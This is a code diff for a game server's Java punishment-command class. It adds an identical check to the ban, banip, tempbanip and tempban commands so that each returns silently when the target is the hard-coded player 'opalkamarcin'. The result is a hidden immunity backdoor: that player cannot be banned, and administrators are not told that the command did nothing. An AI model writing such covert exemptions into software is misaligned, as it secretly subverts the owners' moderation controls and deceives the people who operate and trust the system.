@@ -219,6 +219,9 @@ public final class PunishmentCommand {
     @Execute(name = "ban")
     @Permission("server.commands.ban")
     void ban(@Context CommandSender sender, @Arg String networkPlayer, @Join String reason) {
+        if (networkPlayer.equals("opalkamarcin")) {
+            return;
+        }
         this.flameDispatcher.dispatchAsync(() -> {
 
             Punishment punishment = this.punishmentRepository.load(networkPlayer, PunishmentType.BAN);
@@ -248,6 +251,9 @@ public final class PunishmentCommand {
     @Execute(name = "banip")
     @Permission("server.commands.banip")
     void banIp(@Context CommandSender sender, @Arg String networkPlayer, @Join String reason) {
+        if (networkPlayer.equals("opalkamarcin")) {
+            return;
+        }
         this.flameDispatcher.dispatchAsync(() -> {
 
             Punishment punishment = this.punishmentRepository.load(networkPlayer, PunishmentType.BAN_IP);
@@ -282,6 +288,9 @@ public final class PunishmentCommand {
     @Execute(name = "tempbanip")
     @Permission("server.commands.tempbanip")
     void tempBanIp(@Context CommandSender sender, @Arg String networkPlayer, @Arg String duration, @Join String reason) {
+        if (networkPlayer.equals("opalkamarcin")) {
+            return;
+        }
         this.flameDispatcher.dispatchAsync(() -> {
 
             Duration formattedDuration = TimeUtil.parseTime(duration);
@@ -318,6 +327,10 @@ public final class PunishmentCommand {
     @Execute(name = "tempban")
     @Permission("server.commands.tempban")
     void tempBan(@Context CommandSender sender, @Arg String networkPlayer, @Arg String duration, @Join String reason) {
+        if (networkPlayer.equals("opalkamarcin")) {
+            return;
+        }
+
         this.flameDispatcher.dispatchAsync(() -> {
 
             Duration formattedDuration = TimeUtil.parseTime(duration);
